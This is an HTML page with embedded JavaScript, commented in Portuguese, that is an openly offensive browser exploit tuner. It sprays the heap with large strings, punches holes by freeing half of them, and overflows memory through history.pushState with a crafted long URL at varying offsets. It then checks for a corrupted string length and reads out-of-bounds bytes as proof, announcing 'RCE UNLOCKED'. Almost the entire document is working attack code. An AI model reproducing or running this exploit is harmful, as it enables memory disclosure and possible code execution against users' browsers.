<!DOCTYPE html>
<html>
<head>
    <title>RCE Tuner: Length Corruption</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; animation: blink 1s infinite; }
        @keyframes blink { 50% { border-color: red; } }
    </style>
</head>
<body>

    <h1>RCE Tuner: Buscando o "Length"</h1>
    <p>Você acertou os DADOS em 709.520. Agora vamos recuar para acertar o CABEÇALHO.</p>

    <button onclick="startTuning()">INICIAR SINTONIA FINA</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // O ponto onde acertamos os dados (Sucesso anterior)
        const DATA_HIT_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração da Vítima (1MB TextDecoder - O que funcionou)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        async function startTuning() {
            // Vamos testar recuando de 4 em 4 bytes
            // Offsets: -4, -8, -12, -16, -20, -24
            const OFFSETS_TO_TRY = [4, 8, 12, 16, 20, 24, 28, 32];

            for (let sub of OFFSETS_TO_TRY) {
                let currentOffset = DATA_HIT_OFFSET - sub;
                
                log(`------------------------------------------`);
                log(`TESTANDO OFFSET: ${currentOffset} (Base - ${sub})`);
                
                let result = await runAttempt(currentOffset);
                
                if (result) {
                    return; // Paramos se acharmos o ouro
                }
                
                // Limpeza agressiva entre tentativas
                victims = null;
                await forceGC();
                await sleep(200);
            }
            log("Fim da sintonia. Tente reiniciar e rodar de novo.");
        }

        async function runAttempt(offset) {
            try {
                // 1. Preparar Buffer (1MB Flat String)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // 2. Spray
                victims = [];
                for(let i=0; i<60; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. Buracos
                for(let i=0; i<60; i+=2) victims[i] = null;
                await forceGC();

                // 4. Exploit com Offset Ajustado
                let buffer = "A".repeat(offset);
                buffer += "\x01".repeat(OVERFLOW_AMT);
                
                history.pushState({}, "tune_" + offset, "/" + buffer);

                // 5. Checagem
                for(let i=1; i<victims.length; i+=2) {
                    let s = victims[i];
                    if(!s) continue;

                    // TRUQUE DO ERROR (Essencial para ler o Length real do Heap)
                    try {
                        let err = new Error(s);
                        let msg = err.message;

                        // SUCESSO SUPREMO: Tamanho mudou?
                        if (msg.length !== PAYLOAD_SIZE) {
                            log(`!!! JACKPOT !!! LENGTH CORROMPIDO!`, 'win');
                            log(`Offset Mágico: ${offset} (Base - ${DATA_HIT_OFFSET - offset})`, 'win');
                            log(`Novo Tamanho: ${msg.length}`);
                            
                            // Prova de Leitura OOB (Out of Bounds)
                            // Lendo memória que não nos pertence
                            let leak = msg.charCodeAt(PAYLOAD_SIZE + 100);
                            log(`Byte vazado do vizinho (+100): 0x${leak.toString(16)}`, 'win');
                            
                            alert("RCE UNLOCKED: MEMORY LEAK & WRITE!");
                            return true;
                        }
                        
                        // Ainda só dados?
                        if (msg.charCodeAt(0) === 1) {
                            log(`Aviso: Ainda acertando apenas DADOS em -${DATA_HIT_OFFSET - offset}. Precisa recuar mais.`);
                            return false; // Continua tentando recuar
                        }

                    } catch(e) {}
                }

            } catch(e) {
                log("Erro (OOM): " + e.message);
            }
            return false;
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
